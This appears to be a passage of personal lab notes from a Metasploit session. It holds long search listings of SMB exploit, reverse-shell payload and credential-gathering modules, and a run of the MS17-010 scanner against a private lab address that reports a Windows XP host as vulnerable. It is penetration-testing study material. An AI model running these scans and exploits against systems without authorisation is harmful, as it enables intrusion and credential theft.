   268    \_ target: NetWare 6.5 SP7                                                    .                .          .      .
   269  exploit/windows/oracle/extjob                                                   2007-01-01       excellent  Yes    Oracle Job Scheduler Named Pipe Command Execution
   270  auxiliary/admin/oracle/ora_ntlm_stealer                                         2009-04-07       normal     No     Oracle SMB Relay Code Execution
   271  auxiliary/scanner/dcerpc/petitpotam                                             .                normal     No     PetitPotam
   272  payload/cmd/windows/powershell/x64/custom/reverse_named_pipe                    .                normal     No     Powershell Exec, Windows shellcode stage, Windows x64 Reverse Named Pipe (SMB) Stager
   273  payload/cmd/windows/powershell/custom/reverse_named_pipe                        .                normal     No     Powershell Exec, Windows shellcode stage, Windows x86 Reverse Named Pipe (SMB) Stager
   274  payload/cmd/windows/powershell/x64/meterpreter/reverse_named_pipe               .                normal     No     Powershell Exec, Windows x64 Reverse Named Pipe (SMB) Stager
   275  payload/cmd/windows/powershell/x64/peinject/reverse_named_pipe                  .                normal     No     Powershell Exec, Windows x64 Reverse Named Pipe (SMB) Stager
   276  payload/cmd/windows/powershell/meterpreter/reverse_named_pipe                   .                normal     No     Powershell Exec, Windows x86 Reverse Named Pipe (SMB) Stager
   277  payload/cmd/windows/powershell/peinject/reverse_named_pipe                      .                normal     No     Powershell Exec, Windows x86 Reverse Named Pipe (SMB) Stager
   278  auxiliary/admin/smb/psexec_ntdsgrab                                             .                normal     No     PsExec NTDS.dit And SYSTEM Hive Download Utility
   279  auxiliary/scanner/sap/sap_smb_relay                                             .                normal     No     SAP SMB Relay Abuse
   280  auxiliary/dos/sap/sap_soap_rfc_eps_delete_file                                  .                normal     No     SAP SOAP EPS_DELETE_FILE File Deletion
   281  auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing                    .                normal     No     SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure
   282  auxiliary/scanner/sap/sap_soap_rfc_pfl_check_os_file_existence                  .                normal     No     SAP SOAP RFC PFL_CHECK_OS_FILE_EXISTENCE File Existence Check
   283  auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir                                 .                normal     No     SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing
   284  auxiliary/fuzzers/smb/smb_create_pipe_corrupt                                   .                normal     No     SMB Create Pipe Request Corruption
   285  auxiliary/fuzzers/smb/smb_create_pipe                                           .                normal     No     SMB Create Pipe Request Fuzzer
   286  exploit/windows/smb/smb_doublepulsar_rce                                        2017-04-14       great      Yes    SMB DOUBLEPULSAR Remote Code Execution
   287    \_ target: Execute payload (x64)                                              .                .          .      .
   288    \_ target: Neutralize implant                                                 .                .          .      .
   289  exploit/windows/smb/smb_delivery                                                2016-07-26       excellent  No     SMB Delivery
   290    \_ target: DLL                                                                .                .          .      .
   291    \_ target: PSH                                                                .                .          .      .
   292  auxiliary/admin/smb/list_directory                                              .                normal     No     SMB Directory Listing Utility
   293  auxiliary/scanner/smb/smb_enumusers_domain                                      .                normal     No     SMB Domain User Enumeration
   294  payload/cmd/windows/smb/x64/powershell_bind_tcp                                 .                normal     No     SMB Fetch
   295  payload/cmd/windows/smb/x64/powershell_reverse_tcp                              .                normal     No     SMB Fetch
   296  payload/cmd/windows/smb/x64/powershell_reverse_tcp_ssl                          .                normal     No     SMB Fetch
   297  payload/cmd/windows/smb/x64/meterpreter/bind_tcp_rc4                            .                normal     No     SMB Fetch, Bind TCP Stager (RC4 Stage Encryption, Metasm)
   298  payload/cmd/windows/smb/x64/peinject/bind_tcp_rc4                               .                normal     No     SMB Fetch, Bind TCP Stager (RC4 Stage Encryption, Metasm)
   299  payload/cmd/windows/smb/x64/vncinject/bind_tcp_rc4                              .                normal     No     SMB Fetch, Bind TCP Stager (RC4 Stage Encryption, Metasm)
   300  payload/cmd/windows/smb/x64/meterpreter/bind_tcp_uuid                           .                normal     No     SMB Fetch, Bind TCP Stager with UUID Support (Windows x64)
   301  payload/cmd/windows/smb/x64/peinject/bind_tcp_uuid                              .                normal     No     SMB Fetch, Bind TCP Stager with UUID Support (Windows x64)
   302  payload/cmd/windows/smb/x64/vncinject/bind_tcp_uuid                             .                normal     No     SMB Fetch, Bind TCP Stager with UUID Support (Windows x64)
   303  payload/cmd/windows/smb/x64/meterpreter/reverse_tcp_rc4                         .                normal     No     SMB Fetch, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   304  payload/cmd/windows/smb/x64/peinject/reverse_tcp_rc4                            .                normal     No     SMB Fetch, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   305  payload/cmd/windows/smb/x64/vncinject/reverse_tcp_rc4                           .                normal     No     SMB Fetch, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   306  payload/cmd/windows/smb/x64/meterpreter/reverse_tcp_uuid                        .                normal     No     SMB Fetch, Reverse TCP Stager with UUID Support (Windows x64)
   307  payload/cmd/windows/smb/x64/peinject/reverse_tcp_uuid                           .                normal     No     SMB Fetch, Reverse TCP Stager with UUID Support (Windows x64)
   308  payload/cmd/windows/smb/x64/vncinject/reverse_tcp_uuid                          .                normal     No     SMB Fetch, Reverse TCP Stager with UUID Support (Windows x64)
   309  payload/cmd/windows/smb/x64/encrypted_shell/reverse_tcp                         .                normal     No     SMB Fetch, Windows Command Shell, Encrypted Reverse TCP Stager
   310  payload/cmd/windows/smb/x64/encrypted_shell_reverse_tcp                         .                normal     No     SMB Fetch, Windows Encrypted Reverse Shell
   311  payload/cmd/windows/smb/x64/messagebox                                          .                normal     No     SMB Fetch, Windows MessageBox x64
   312  payload/cmd/windows/smb/x64/meterpreter_bind_named_pipe                         .                normal     No     SMB Fetch, Windows Meterpreter Shell, Bind Named Pipe Inline (x64)
   313  payload/cmd/windows/smb/x64/meterpreter_bind_tcp                                .                normal     No     SMB Fetch, Windows Meterpreter Shell, Bind TCP Inline (x64)
   314  payload/cmd/windows/smb/x64/meterpreter_reverse_http                            .                normal     No     SMB Fetch, Windows Meterpreter Shell, Reverse HTTP Inline (x64)
   315  payload/cmd/windows/smb/x64/meterpreter_reverse_https                           .                normal     No     SMB Fetch, Windows Meterpreter Shell, Reverse HTTPS Inline (x64)
   316  payload/cmd/windows/smb/x64/meterpreter_reverse_ipv6_tcp                        .                normal     No     SMB Fetch, Windows Meterpreter Shell, Reverse TCP Inline (IPv6) (x64)
   317  payload/cmd/windows/smb/x64/meterpreter_reverse_tcp                             .                normal     No     SMB Fetch, Windows Meterpreter Shell, Reverse TCP Inline x64
   318  payload/cmd/windows/smb/x64/custom/bind_tcp_rc4                                 .                normal     No     SMB Fetch, Windows shellcode stage, Bind TCP Stager (RC4 Stage Encryption, Metasm)
   319  payload/cmd/windows/smb/x64/custom/bind_tcp_uuid                                .                normal     No     SMB Fetch, Windows shellcode stage, Bind TCP Stager with UUID Support (Windows x64)
   320  payload/cmd/windows/smb/x64/custom/reverse_tcp_rc4                              .                normal     No     SMB Fetch, Windows shellcode stage, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   321  payload/cmd/windows/smb/x64/custom/reverse_tcp_uuid                             .                normal     No     SMB Fetch, Windows shellcode stage, Reverse TCP Stager with UUID Support (Windows x64)
   322  payload/cmd/windows/smb/x64/custom/bind_named_pipe                              .                normal     No     SMB Fetch, Windows shellcode stage, Windows x64 Bind Named Pipe Stager
   323  payload/cmd/windows/smb/x64/custom/bind_tcp                                     .                normal     No     SMB Fetch, Windows shellcode stage, Windows x64 Bind TCP Stager
   324  payload/cmd/windows/smb/x64/custom/bind_ipv6_tcp                                .                normal     No     SMB Fetch, Windows shellcode stage, Windows x64 IPv6 Bind TCP Stager
   325  payload/cmd/windows/smb/x64/custom/bind_ipv6_tcp_uuid                           .                normal     No     SMB Fetch, Windows shellcode stage, Windows x64 IPv6 Bind TCP Stager with UUID Support
   326  payload/cmd/windows/smb/x64/custom/reverse_winhttp                              .                normal     No     SMB Fetch, Windows shellcode stage, Windows x64 Reverse HTTP Stager (winhttp)
   327  payload/cmd/windows/smb/x64/custom/reverse_http                                 .                normal     No     SMB Fetch, Windows shellcode stage, Windows x64 Reverse HTTP Stager (wininet)
   328  payload/cmd/windows/smb/x64/custom/reverse_https                                .                normal     No     SMB Fetch, Windows shellcode stage, Windows x64 Reverse HTTP Stager (wininet)
   329  payload/cmd/windows/smb/x64/custom/reverse_winhttps                             .                normal     No     SMB Fetch, Windows shellcode stage, Windows x64 Reverse HTTPS Stager (winhttp)
   330  payload/cmd/windows/smb/x64/custom/reverse_named_pipe                           .                normal     No     SMB Fetch, Windows shellcode stage, Windows x64 Reverse Named Pipe (SMB) Stager
   331  payload/cmd/windows/smb/x64/custom/reverse_tcp                                  .                normal     No     SMB Fetch, Windows shellcode stage, Windows x64 Reverse TCP Stager
   332  payload/cmd/windows/smb/x64/meterpreter/bind_named_pipe                         .                normal     No     SMB Fetch, Windows x64 Bind Named Pipe Stager
   333  payload/cmd/windows/smb/x64/peinject/bind_named_pipe                            .                normal     No     SMB Fetch, Windows x64 Bind Named Pipe Stager
   334  payload/cmd/windows/smb/x64/vncinject/bind_named_pipe                           .                normal     No     SMB Fetch, Windows x64 Bind Named Pipe Stager
   335  payload/cmd/windows/smb/x64/meterpreter/bind_tcp                                .                normal     No     SMB Fetch, Windows x64 Bind TCP Stager
   336  payload/cmd/windows/smb/x64/peinject/bind_tcp                                   .                normal     No     SMB Fetch, Windows x64 Bind TCP Stager
   337  payload/cmd/windows/smb/x64/vncinject/bind_tcp                                  .                normal     No     SMB Fetch, Windows x64 Bind TCP Stager
   338  payload/cmd/windows/smb/x64/shell_bind_tcp                                      .                normal     No     SMB Fetch, Windows x64 Command Shell, Bind TCP Inline
   339  payload/cmd/windows/smb/x64/shell/bind_tcp_rc4                                  .                normal     No     SMB Fetch, Windows x64 Command Shell, Bind TCP Stager (RC4 Stage Encryption, Metasm)
   340  payload/cmd/windows/smb/x64/shell/bind_tcp_uuid                                 .                normal     No     SMB Fetch, Windows x64 Command Shell, Bind TCP Stager with UUID Support (Windows x64)
   341  payload/cmd/windows/smb/x64/shell_reverse_tcp                                   .                normal     No     SMB Fetch, Windows x64 Command Shell, Reverse TCP Inline
   342  payload/cmd/windows/smb/x64/shell/reverse_tcp_rc4                               .                normal     No     SMB Fetch, Windows x64 Command Shell, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   343  payload/cmd/windows/smb/x64/shell/reverse_tcp_uuid                              .                normal     No     SMB Fetch, Windows x64 Command Shell, Reverse TCP Stager with UUID Support (Windows x64)
   344  payload/cmd/windows/smb/x64/shell/bind_named_pipe                               .                normal     No     SMB Fetch, Windows x64 Command Shell, Windows x64 Bind Named Pipe Stager
   345  payload/cmd/windows/smb/x64/shell/bind_tcp                                      .                normal     No     SMB Fetch, Windows x64 Command Shell, Windows x64 Bind TCP Stager
   346  payload/cmd/windows/smb/x64/shell/bind_ipv6_tcp                                 .                normal     No     SMB Fetch, Windows x64 Command Shell, Windows x64 IPv6 Bind TCP Stager
   347  payload/cmd/windows/smb/x64/shell/bind_ipv6_tcp_uuid                            .                normal     No     SMB Fetch, Windows x64 Command Shell, Windows x64 IPv6 Bind TCP Stager with UUID Support
   348  payload/cmd/windows/smb/x64/shell/reverse_tcp                                   .                normal     No     SMB Fetch, Windows x64 Command Shell, Windows x64 Reverse TCP Stager
   349  payload/cmd/windows/smb/x64/exec                                                .                normal     No     SMB Fetch, Windows x64 Execute Command
   350  payload/cmd/windows/smb/x64/meterpreter/bind_ipv6_tcp                           .                normal     No     SMB Fetch, Windows x64 IPv6 Bind TCP Stager
   351  payload/cmd/windows/smb/x64/peinject/bind_ipv6_tcp                              .                normal     No     SMB Fetch, Windows x64 IPv6 Bind TCP Stager
   352  payload/cmd/windows/smb/x64/vncinject/bind_ipv6_tcp                             .                normal     No     SMB Fetch, Windows x64 IPv6 Bind TCP Stager
   353  payload/cmd/windows/smb/x64/meterpreter/bind_ipv6_tcp_uuid                      .                normal     No     SMB Fetch, Windows x64 IPv6 Bind TCP Stager with UUID Support
   354  payload/cmd/windows/smb/x64/peinject/bind_ipv6_tcp_uuid                         .                normal     No     SMB Fetch, Windows x64 IPv6 Bind TCP Stager with UUID Support
   355  payload/cmd/windows/smb/x64/vncinject/bind_ipv6_tcp_uuid                        .                normal     No     SMB Fetch, Windows x64 IPv6 Bind TCP Stager with UUID Support
   356  payload/cmd/windows/smb/x64/loadlibrary                                         .                normal     No     SMB Fetch, Windows x64 LoadLibrary Path
   357  payload/cmd/windows/smb/x64/pingback_reverse_tcp                                .                normal     No     SMB Fetch, Windows x64 Pingback, Reverse TCP Inline
   358  payload/cmd/windows/smb/x64/meterpreter/reverse_winhttp                         .                normal     No     SMB Fetch, Windows x64 Reverse HTTP Stager (winhttp)
   359  payload/cmd/windows/smb/x64/vncinject/reverse_winhttp                           .                normal     No     SMB Fetch, Windows x64 Reverse HTTP Stager (winhttp)
   360  payload/cmd/windows/smb/x64/meterpreter/reverse_http                            .                normal     No     SMB Fetch, Windows x64 Reverse HTTP Stager (wininet)
   361  payload/cmd/windows/smb/x64/meterpreter/reverse_https                           .                normal     No     SMB Fetch, Windows x64 Reverse HTTP Stager (wininet)
   362  payload/cmd/windows/smb/x64/vncinject/reverse_http                              .                normal     No     SMB Fetch, Windows x64 Reverse HTTP Stager (wininet)
   363  payload/cmd/windows/smb/x64/vncinject/reverse_https                             .                normal     No     SMB Fetch, Windows x64 Reverse HTTP Stager (wininet)
   364  payload/cmd/windows/smb/x64/meterpreter/reverse_winhttps                        .                normal     No     SMB Fetch, Windows x64 Reverse HTTPS Stager (winhttp)
   365  payload/cmd/windows/smb/x64/vncinject/reverse_winhttps                          .                normal     No     SMB Fetch, Windows x64 Reverse HTTPS Stager (winhttp)
   366  payload/cmd/windows/smb/x64/meterpreter/reverse_named_pipe                      .                normal     No     SMB Fetch, Windows x64 Reverse Named Pipe (SMB) Stager
   367  payload/cmd/windows/smb/x64/peinject/reverse_named_pipe                         .                normal     No     SMB Fetch, Windows x64 Reverse Named Pipe (SMB) Stager
   368  payload/cmd/windows/smb/x64/meterpreter/reverse_tcp                             .                normal     No     SMB Fetch, Windows x64 Reverse TCP Stager
   369  payload/cmd/windows/smb/x64/peinject/reverse_tcp                                .                normal     No     SMB Fetch, Windows x64 Reverse TCP Stager
   370  payload/cmd/windows/smb/x64/vncinject/reverse_tcp                               .                normal     No     SMB Fetch, Windows x64 Reverse TCP Stager
   371  auxiliary/admin/smb/delete_file                                                 .                normal     No     SMB File Delete Utility
   372  auxiliary/admin/smb/download_file                                               .                normal     No     SMB File Download Utility
   373  auxiliary/admin/smb/upload_file                                                 .                normal     No     SMB File Upload Utility
   374  auxiliary/scanner/smb/smb_enum_gpp                                              .                normal     No     SMB Group Policy Preference Saved Passwords Enumeration
   375  auxiliary/scanner/smb/smb_login                                                 .                normal     No     SMB Login Check Scanner
   376  auxiliary/fuzzers/smb/smb_ntlm1_login_corrupt                                   .                normal     No     SMB NTLMv1 Login Request Corruption
   377  auxiliary/fuzzers/smb/smb_negotiate_corrupt                                     .                normal     No     SMB Negotiate Dialect Corruption
   378  auxiliary/fuzzers/smb/smb2_negotiate_corrupt                                    .                normal     No     SMB Negotiate SMB2 Dialect Corruption
   379  auxiliary/scanner/smb/smb_lookupsid                                             .                normal     No     SMB SID User Enumeration (LookupSid)
   380    \_ action: DOMAIN                                                             .                .          .      Enumerate domain accounts
   381    \_ action: LOCAL                                                              .                .          .      Enumerate local accounts
   382  auxiliary/admin/smb/check_dir_file                                              .                normal     No     SMB Scanner Check File/Directory Utility
   383  auxiliary/scanner/smb/pipe_auditor                                              .                normal     No     SMB Session Pipe Auditor
   384  auxiliary/scanner/smb/pipe_dcerpc_auditor                                       .                normal     No     SMB Session Pipe DCERPC Auditor
   385  auxiliary/scanner/smb/smb_enumshares                                            .                normal     No     SMB Share Enumeration
   386  auxiliary/fuzzers/smb/smb_tree_connect_corrupt                                  .                normal     No     SMB Tree Connect Request Corruption
   387  auxiliary/fuzzers/smb/smb_tree_connect                                          .                normal     No     SMB Tree Connect Request Fuzzer
   388  auxiliary/scanner/smb/smb_enumusers                                             .                normal     No     SMB User Enumeration (SAM EnumUsers)
   389  auxiliary/scanner/smb/smb_version                                               .                normal     No     SMB Version Detection
   390  auxiliary/dos/smb/smb_loris                                                     2017-06-29       normal     No     SMBLoris NBSS Denial of Service
   391  exploit/windows/local/cve_2020_0796_smbghost                                    2020-03-13       good       Yes    SMBv3 Compression Buffer Overflow
   392    \_ AKA: SMBGhost                                                              .                .          .      .
   393    \_ AKA: CoronaBlue                                                            .                .          .      .
   394  exploit/windows/smb/cve_2020_0796_smbghost                                      2020-03-13       average    Yes    SMBv3 Compression Buffer Overflow
   395    \_ AKA: SMBGhost                                                              .                .          .      .
   396    \_ AKA: CoronaBlue                                                            .                .          .      .
   397  auxiliary/scanner/snmp/snmp_enumshares                                          .                normal     No     SNMP Windows SMB Share Enumeration
   398  auxiliary/admin/smb/samba_symlink_traversal                                     .                normal     No     Samba Symlink Directory Traversal
   399  auxiliary/scanner/smb/smb_uninit_cred                                           .                normal     Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
   400  exploit/linux/samba/chain_reply                                                 2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
   401    \_ target: Linux (Debian5 3.2.5-4lenny6)                                      .                .          .      .
   402    \_ target: Debugging Target                                                   .                .          .      .
   403  auxiliary/dos/samba/read_nttrans_ea_list                                        .                normal     No     Samba read_nttrans_ea_list Integer Overflow
   404  exploit/multi/ids/snort_dce_rpc                                                 2007-02-19       good       No     Snort 2 DCE/RPC Preprocessor Buffer Overflow
   405    \_ target: Windows Universal                                                  .                .          .      .
   406    \_ target: Redhat 8                                                           .                .          .      .
   407  exploit/windows/browser/java_ws_double_quote                                    2012-10-16       excellent  No     Sun Java Web Start Double Quote Injection
   408    \_ target: Automatic                                                          .                .          .      .
   409    \_ target: Java Runtime 1.6.31 to 1.6.35 and 1.7.03 to 1.7.07 on Windows x86  .                .          .      .
   410  exploit/windows/browser/java_ws_arginject_altjvm                                2010-04-09       excellent  No     Sun Java Web Start Plugin Command Line Argument Injection
   411    \_ target: Automatic                                                          .                .          .      .
   412    \_ target: Java Runtime on Windows x86                                        .                .          .      .
   413  exploit/windows/browser/java_ws_vmargs                                          2012-02-14       excellent  No     Sun Java Web Start Plugin Command Line Argument Injection
   414    \_ target: Automatic                                                          .                .          .      .
   415    \_ target: Java Runtime on Windows x86                                        .                .          .      .
   416  payload/cmd/windows/tftp/x64/custom/reverse_named_pipe                          .                normal     No     TFTP Fetch, Windows shellcode stage, Windows x64 Reverse Named Pipe (SMB) Stager
   417  payload/cmd/windows/tftp/x64/meterpreter/reverse_named_pipe                     .                normal     No     TFTP Fetch, Windows x64 Reverse Named Pipe (SMB) Stager
   418  payload/cmd/windows/tftp/x64/peinject/reverse_named_pipe                        .                normal     No     TFTP Fetch, Windows x64 Reverse Named Pipe (SMB) Stager
   419  auxiliary/server/teamviewer_uri_smb_redirect                                    .                normal     No     TeamViewer Unquoted URI Handler SMB Redirect
   420  exploit/windows/fileformat/theme_dll_hijack_cve_2023_38146                      2023-09-13       excellent  No     Themebleed- Windows 11 Themes Arbitrary Code Execution CVE-2023-38146
   421  exploit/windows/smb/timbuktu_plughntcommand_bof                                 2009-06-25       great      No     Timbuktu PlughNTCommand Named Pipe Buffer Overflow
   422  exploit/windows/fileformat/ursoft_w32dasm                                       2005-01-24       good       No     URSoft W32Dasm Disassembler Function Buffer Overflow
   423  exploit/windows/fileformat/vlc_smb_uri                                          2009-06-24       great      No     VideoLAN Client (VLC) Win32 smb:// URI Buffer Overflow
   424  auxiliary/scanner/smb/impacket/wmiexec                                          2018-03-19       normal     No     WMI Exec
   425  auxiliary/admin/smb/webexec_command                                             .                normal     No     WebEx Remote Command Execution Utility
   426  exploit/windows/smb/webexec                                                     2018-10-24       manual     No     WebExec Authenticated User Code Execution
   427    \_ target: Automatic                                                          .                .          .      .
   428    \_ target: Native upload                                                      .                .          .      .
   429  post/windows/escalate/droplnk                                                   .                normal     No     Windows Escalate SMB Icon LNK Dropper
   430  post/windows/gather/credentials/gpp                                             .                normal     No     Windows Gather Group Policy Preference Saved Passwords
   431  post/windows/gather/word_unc_injector                                           .                normal     No     Windows Gather Microsoft Office Word UNC Path Injector
   432  post/windows/gather/enum_shares                                                 .                normal     No     Windows Gather SMB Share Enumeration via Registry
   433  payload/windows/peinject/reverse_named_pipe                                     .                normal     No     Windows Inject PE Files, Windows x86 Reverse Named Pipe (SMB) Stager
   434  payload/windows/x64/peinject/reverse_named_pipe                                 .                normal     No     Windows Inject Reflective PE Files, Windows x64 Reverse Named Pipe (SMB) Stager
   435  payload/windows/x64/meterpreter/reverse_named_pipe                              .                normal     No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
   436  payload/windows/meterpreter/reverse_named_pipe                                  .                normal     No     Windows Meterpreter (Reflective Injection), Windows x86 Reverse Named Pipe (SMB) Stager
   437  post/windows/gather/netlm_downgrade                                             .                normal     No     Windows NetLM Downgrade Attack
   438  auxiliary/fileformat/multidrop                                                  .                normal     No     Windows SMB Multi Dropper
   439  payload/windows/x64/custom/reverse_named_pipe                                   .                normal     No     Windows shellcode stage, Windows x64 Reverse Named Pipe (SMB) Stager
   440  payload/windows/custom/reverse_named_pipe                                       .                normal     No     Windows shellcode stage, Windows x86 Reverse Named Pipe (SMB) Stager
   441  exploit/multi/http/pgadmin_session_deserialization                              2024-03-04       excellent  Yes    pgAdmin Session Deserialization RCE


Interact with a module by name or index. For example info 441, use 441 or use exploit/multi/http/pgadmin_session_deserialization

===========================================================================================================================
===========================================================================================================================
  223  auxiliary/scanner/smb/smb_ms17_010                                              .                normal     No     MS17-010 SMB RCE Detection
(it will tell us our machine is vulnerable or not)
===========================================================================================================================
===========================================================================================================================
msf6 > use auxiliary/scanner/smb/smb_ms17_010 
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting          Required  Description
   ----         ---------------          --------  -----------
   CHECK_ARCH   true                     no        Check for architecture on vulnerable ho
                                                   sts
   CHECK_DOPU   true                     no        Check for DOUBLEPULSAR on vulnerable ho
                                                   sts
   CHECK_PIPE   false                    no        Check for named pipe on vulnerable host
                                                   s
   NAMED_PIPES  /opt/metasploit-framewo  yes       List of named pipes to check
                rk/embedded/framework/d
                ata/wordlists/named_pip
                es.txt
   RHOSTS                                yes       The target host(s), see https://docs.me
                                                   tasploit.com/docs/using-metasploit/basi
                                                   cs/using-metasploit.html
   RPORT        445                      yes       The SMB service port (TCP)
   SMBDomain    .                        no        The Windows domain to use for authentic
                                                   ation
   SMBPass                               no        The password for the specified username
   SMBUser                               no        The username to authenticate as
   THREADS      1                        yes       The number of concurrent threads (max o
                                                   ne per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.44.160
RHOSTS => 192.168.44.160
msf6 auxiliary(scanner/smb/smb_ms17_010) > exploit

[+] 192.168.44.160:445    - Host is likely VULNERABLE to MS17-010! - Windows XP 3790 Service Pack 1 x86 (32-bit)
[*] 192.168.44.160:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_ms17_010) > 

===========================================================================================================================
===========================================================================================================================



msf6 auxiliary(scanner/smb/smb_ms17_010) > search smb exploit

Matching Modules
================

   #    Name                                                                            Disclosure Date  Rank       Check  Description
   -    ----                                                                            ---------------  ----       -----  -----------
   0    exploit/multi/http/struts_code_exec_classloader                                 2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   1      \_ target: Java                                                               .                .          .      .
   2      \_ target: Linux                                                              .                .          .      .
   3      \_ target: Windows                                                            .                .          .      .
   4      \_ target: Windows / Tomcat 6 & 7 and GlassFish 4 (Remote SMB Resource)       .                .          .      .
   5    exploit/osx/browser/safari_file_policy                                          2011-10-12       normal     No     Apple Safari file:// Arbitrary Code Execution
   6      \_ target: Safari 5.1 on OS X                                                 .                .          .      .
   7      \_ target: Safari 5.1 on OS X with Java                                       .                .          .      .
   8    auxiliary/server/capture/smb                                                    .                normal     No     Authentication Capture: SMB
   9    exploit/linux/misc/cisco_rv340_sslvpn                                           2022-02-02       good       Yes    Cisco RV340 SSL VPN Unauthenticated Remote Code Execution
   10   auxiliary/scanner/http/citrix_dir_traversal                                     2019-12-17       normal     No     Citrix ADC (NetScaler) Directory Traversal Scanner
   11   exploit/windows/scada/ge_proficy_cimplicity_gefebt                              2014-01-23       excellent  Yes    GE Proficy CIMPLICITY gefebt.exe Remote Code Execution
   12   exploit/windows/smb/generic_smb_dll_injection                                   2015-03-04       manual     No     Generic DLL Injection From Shared Resource
   13     \_ target: Windows x86                                                        .                .          .      .
   14     \_ target: Windows x64                                                        .                .          .      .
   15   exploit/windows/http/generic_http_dll_injection                                 2015-03-04       manual     No     Generic Web Application DLL Injection
   16     \_ target: Windows x86                                                        .                .          .      .
   17     \_ target: Windows x64                                                        .                .          .      .
   18   exploit/windows/smb/group_policy_startup                                        2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
   19     \_ target: Windows x86                                                        .                .          .      .
   20     \_ target: Windows x64                                                        .                .          .      .
   21   exploit/windows/misc/hp_dataprotector_install_service                           2011-11-02       excellent  Yes    HP Data Protector 6.10/6.11/6.20 Install Service
   22   exploit/windows/misc/hp_dataprotector_cmd_exec                                  2014-11-02       excellent  Yes    HP Data Protector 8.10 Remote Command Execution
   23   exploit/windows/smb/ipass_pipe_exec                                             2015-01-21       excellent  Yes    IPass Control Pipe Remote Command Execution
   24     \_ target: Windows x32                                                        .                .          .      .
   25     \_ target: Windows x64                                                        .                .          .      .
   26   exploit/windows/smb/ms03_049_netapi                                             2003-11-11       good       No     MS03-049 Microsoft Workstation Service NetAddAlternateComputerName Overflow
   27   exploit/windows/smb/ms04_007_killbill                                           2004-02-10       low        No     MS04-007 Microsoft ASN.1 Library Bitstring Heap Overflow
   28   exploit/windows/smb/ms04_011_lsass                                              2004-04-13       good       No     MS04-011 Microsoft LSASS Service DsRolerUpgradeDownlevelServer Overflow
   29     \_ target: Automatic Targetting                                               .                .          .      .
   30     \_ target: Windows 2000 English                                               .                .          .      .
   31     \_ target: Windows XP English                                                 .                .          .      .
   32   exploit/windows/smb/ms04_031_netdde                                             2004-10-12       good       No     MS04-031 Microsoft NetDDE Service Overflow
   33   exploit/windows/smb/ms05_039_pnp                                                2005-08-09       good       Yes    MS05-039 Microsoft Plug and Play Service Overflow
   34     \_ target: Windows 2000 SP0-SP4                                               .                .          .      .
   35     \_ target: Windows 2000 SP4 French                                            .                .          .      .
   36     \_ target: Windows 2000 SP4 Spanish                                           .                .          .      .
   37     \_ target: Windows 2000 SP4 Universal                                         .                .          .      .
   38     \_ target: Windows 2000 SP0-SP4 German                                        .                .          .      .
   39     \_ target: Windows 2000 SP0-SP4 Italian                                       .                .          .      .
   40     \_ target: Windows XP SP1 English                                             .                .          .      .
   41     \_ target: Windows XP SP2 English (Requires Admin)                            .                .          .      .
   42     \_ target: Windows Server 2003 SP0 English (Requires Admin)                   .                .          .      .
   43     \_ target: Windows Server 2003 SP1 English (Requires Admin)                   .                .          .      .
   44   exploit/windows/smb/ms06_025_rras                                               2006-06-13       average    No     MS06-025 Microsoft RRAS Service Overflow
   45     \_ target: Automatic                                                          .                .          .      .
   46     \_ target: Windows 2000 SP4                                                   .                .          .      .
   47     \_ target: Windows XP SP1                                                     .                .          .      .
   48   exploit/windows/smb/ms06_025_rasmans_reg                                        2006-06-13       good       No     MS06-025 Microsoft RRAS Service RASMAN Registry Overflow
   49   exploit/windows/smb/ms06_040_netapi                                             2006-08-08       good       No     MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow
   50     \_ target: (wcscpy) Automatic (NT 4.0, 2000 SP0-SP4, XP SP0-SP1)              .                .          .      .
   51     \_ target: (wcscpy) Windows NT 4.0 / Windows 2000 SP0-SP4                     .                .          .      .
   52     \_ target: (wcscpy) Windows XP SP0/SP1                                        .                .          .      .
   53     \_ target: (stack)  Windows XP SP1 English                                    .                .          .      .
   54     \_ target: (stack)  Windows XP SP1 Italian                                    .                .          .      .
   55     \_ target: (wcscpy) Windows 2003 SP0                                          .                .          .      .
   56   exploit/windows/smb/ms06_066_nwapi                                              2006-11-14       good       No     MS06-066 Microsoft Services nwapi32.dll Module Exploit
   57   exploit/windows/smb/ms06_066_nwwks                                              2006-11-14       good       No     MS06-066 Microsoft Services nwwks.dll Module Exploit
   58   exploit/windows/smb/ms06_070_wkssvc                                             2006-11-14       manual     No     MS06-070 Microsoft Workstation Service NetpManageIPCConnect Overflow
   59     \_ target: Automatic Targetting                                               .                .          .      .
   60     \_ target: Windows 2000 SP4                                                   .                .          .      .
   61     \_ target: Windows XP SP0/SP1                                                 .                .          .      .
   62   exploit/windows/smb/ms07_029_msdns_zonename                                     2007-04-12       manual     No     MS07-029 Microsoft DNS RPC Service extractQuotedChar() Overflow (SMB)
   63     \_ target: Automatic (2000 SP0-SP4, 2003 SP0-SP2)                             .                .          .      .
   64     \_ target: Windows 2000 Server SP0-SP4+ English                               .                .          .      .
   65     \_ target: Windows 2000 Server SP0-SP4+ French                                .                .          .      .
   66     \_ target: Windows 2000 Server SP0-SP4+ German                                .                .          .      .
   67     \_ target: Windows 2000 Server SP0-SP4+ Italian                               .                .          .      .
   68     \_ target: Windows 2000 Server SP0-SP4+ Polish                                .                .          .      .
   69     \_ target: Windows 2000 Server SP0-SP4+ Portuguese                            .                .          .      .
   70     \_ target: Windows 2000 Server SP0-SP4+ Korean                                .                .          .      .
   71     \_ target: Windows 2000 Server SP0-SP4+ Russian                               .                .          .      .
